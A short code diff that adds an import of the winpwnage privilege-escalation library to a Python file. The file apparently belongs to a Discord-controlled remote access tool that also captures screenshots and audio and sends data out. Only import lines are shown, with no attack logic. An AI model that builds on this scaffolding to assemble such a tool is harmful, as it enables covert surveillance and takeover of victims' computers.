@@ -4,6 +4,7 @@ import sounddevice as sd
 from PIL import ImageGrab
 from core.info import Info
 from core.sender import Sender
+from winpwnage.function import *
 from discord.ext import commands
 from urllib.parse import urlparse
 from pretty_help import PrettyHelp
